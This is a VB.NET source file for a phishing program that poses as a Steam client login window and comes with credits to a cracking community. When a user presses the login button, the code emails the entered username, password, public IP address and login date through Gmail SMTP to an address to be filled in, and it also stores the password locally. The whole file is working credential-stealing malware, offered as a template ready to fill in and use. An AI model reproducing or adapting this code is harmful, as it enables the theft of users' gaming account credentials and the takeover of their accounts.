Imports System.Net
Imports System.IO
Imports System.Net.Mail
Public Class Form1
    'NinjaGhost
    'Tolong kembangkan kembali script ini \\ by NinjaGhost < Translate to english
    'DrWeabo - www.youtube.com/DrWeabo
    'Special Thanks to ParadoxCommunity - www.crackingparadox.com
    Private Sub SteamButton2_Click(sender As Object, e As EventArgs) Handles SteamButton2.Click
        Me.Close()
    End Sub

    Private Sub SteamButton3_Click(sender As Object, e As EventArgs) Handles SteamButton3.Click
        Shell("explorer.exe https://help.steampowered.com/en/wizard/HelpWithLogin?redir=clientlogin")
    End Sub

    Private Sub SteamButton4_Click(sender As Object, e As EventArgs) Handles SteamButton4.Click
        Shell("explorer.exe https://store.steampowered.com/join/?l=english")
    End Sub

    Private Sub SteamCheckBox1_CheckedChanged(sender As Object) Handles SteamCheckBox1.CheckedChanged
        If SteamCheckBox1.Checked = True Then
            My.Settings.username = SteamTextBox1.Text
            My.Settings.password = SteamTextBox2.Text
            My.Settings.Save()
            My.Settings.Reload()
        End If
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.CheckForIllegalCrossThreadCalls = False
        SteamTextBox1.Text = My.Settings.username
        SteamTextBox2.Text = My.Settings.password
        WebBrowser1.Navigate("https://tools.feron.it/php/ip.php")
        Timer1.Start()
        MsgBox("Steam Cracked by NinjaGhost", MsgBoxStyle.Information)
    End Sub

    Private Sub SteamButton1_Click(sender As Object, e As EventArgs) Handles SteamButton1.Click
        Dim MyMailMassage As New MailMessage
            MyMailMassage.From = New MailAddress("youremails@gmail.com")
            MyMailMassage.To.Add("youremails@gmail.com")
            MyMailMassage.Subject = "RESULT| " + me.text + "|" + "IP: " + IP.Text + "|" + "Date: " + Date.Now + "|" + "Username: " + SteamTextBox1.Text + "|" & "Password: " + steamTextBox2.Text + ""
            MyMailMassage.Body = ">-----------------| RESULT: STEAM by NinjaGhost |------------------<" + vbNewLine + "Email: " + SteamTextBox1.Text + vbNewLine + "Username: " + SteamTextBox1.Text + vbNewLine + "Password: " + SteamTextBox2.Text + vbNewLine + "Login Date: " + Date.Now + vbNewLine + ">-----------------| Information Location |------------------<" + vbNewLine + "IP: " + IP.Text + vbNewLine + ">-----------------| Information License |------------------<" + vbNewLine + "Tools: " + me.text + vbNewLine + "About: Copyright NinjaGhost @ 2018 All - Reverved. " + vbNewLine + ">-----------------| Information Version |------------------<" + vbNewLine + "Version : " + My.Application.Info.Version.ToString + ""
            Dim smtpServer As New SmtpClient("smtp.gmail.com")
            smtpServer.Port = 587
            smtpServer.EnableSsl = True
            smtpServer.Credentials = New System.Net.NetworkCredential("youremails@gmail.com", "password")
            smtpServer.Send(MyMailMassage)
            Form3.Show()
            Me.Hide()
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        WebBrowser1.Navigate("https://tools.feron.it/php/ip.php")
        IP.Text = WebBrowser1.DocumentText.ToString
        Timer1.Stop()
    End Sub
End Class
